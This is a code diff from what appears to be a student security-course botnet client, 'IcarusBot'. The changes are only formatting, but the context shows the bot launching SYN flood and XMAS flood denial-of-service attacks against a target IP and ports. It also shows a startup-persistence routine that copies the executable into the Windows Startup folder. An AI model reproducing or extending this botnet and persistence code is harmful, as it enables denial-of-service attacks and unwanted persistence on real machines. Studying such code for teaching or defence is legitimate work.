@@ -152,9 +152,9 @@ class IcarusBot:
                     # TODO: Specify port(s) to attack
                     try:
                         if attack_type == 'SYN_FLOOD':
-                            #attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, NUM_PACKETS_TO_SEND, [1]))
-                            #attack_thread.start()
-                            #attack_thread.join()
+                            # attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, NUM_PACKETS_TO_SEND, [1]))
+                            # attack_thread.start()
+                            # attack_thread.join()
                             syn_flood.SYN_Flood(target_ip, NUM_PACKETS_TO_SEND, ports)
                         elif attack_type == 'XMAS_FLOOD':
                             xmas_attack.XMAS_Attack(target_ip, NUM_PACKETS_TO_SEND, ports)
@@ -239,13 +239,14 @@ def notification(action):
         threaded=True,
     )
 
+
 def add_to_startup(file_path=""):
     if file_path == "":
         file_path = os.path.realpath(sys.argv[0])
     exe_path = f"{os.environ['SYSTEMDRIVE']}\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\coms4507-bot.exe"
     # only copy across if startup directory exists and file doesn't
-    if (os.path.exists(os.path.dirname(exe_path)) and not os.path.exists(exe_path)):
-            shutil.copy(file_path, exe_path)
+    if os.path.exists(os.path.dirname(exe_path)) and not os.path.exists(exe_path):
+        shutil.copy(file_path, exe_path)
 
 
 def main():
